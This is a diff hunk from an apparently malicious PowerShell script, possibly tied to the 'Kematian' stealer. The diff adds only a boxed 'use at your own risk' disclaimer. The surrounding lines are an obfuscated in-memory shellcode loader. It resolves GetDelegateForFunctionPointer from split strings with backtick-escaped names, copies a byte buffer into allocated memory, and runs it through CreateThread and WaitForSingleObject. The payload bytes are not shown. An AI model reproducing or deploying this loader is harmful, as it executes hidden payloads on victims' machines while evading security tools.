@@ -37,3 +37,22 @@ $lpMem = [System.Runtime.InteropServices.Marshal]::('G'+('Etde'+'Le'+'ga')+('TEF
 [System.Runtime.InteropServices.Marshal]::('Co'+'pY').Invoke($kematianthegreat, 0, $lpMem, $kematianthegreat."Le`N`GtH")
 $hThread = [System.Runtime.InteropServices.Marshal]::('ge'+('Tde'+'L')+('E'+'gatE')+'Fo'+'R'+('func'+'TI'+'oNp')+'oi'+'NT'+'eR').Invoke((KematianLoader kernel32.dll CreateThread), (kematian_delegates @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr])))."Invo`Ke"([IntPtr]::"ZE`Ro", 0, $lpMem, [IntPtr]::"ze`Ro", 0, [IntPtr]::"zE`Ro")
 [System.Runtime.InteropServices.Marshal]::(('get'+'DELE'+'G')+('at'+'e')+'F'+'oR'+('f'+'unC')+'TI'+('ONP'+'oIn')+('t'+'er')).Invoke((KematianLoader kernel32.dll WaitForSingleObject), (kematian_delegates @([IntPtr], [Int32])([Int])))."I`NvOKe"($hThread, 0xFFFFFFFF)
+#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+#║						                              NOTES                                                      ║
+#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+#║														                                                         ║
+#║Disclaimer:													                                                 ║
+#║This script is provided "as is" without warranty of any kind, either express or implied, including but not 	 ║
+#║limited to the implied warranties of merchantability and fitness for a particular purpose. The entire risk as  ║
+#║to the quality and performance of the script is with you. Should the script prove defective, you assume the    ║
+#║cost of all necessary servicing, repair, or correction.							                             ║
+#║														                                                         ║
+#║Use this script at your own risk. The author or distributor is not responsible for any damage or loss, 	     ║ 																										
+#║including but not limited to loss of data, business interruption, or personal injury, arising from the use or  ║
+#║inability to use this script.											                                         ║
+#║														                                                         ║
+#║By using this script, you agree to these terms and conditions. If you do not agree to these terms, do not use  ║ 
+#║this script.													                                                 ║
+#║														                                                         ║
+#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
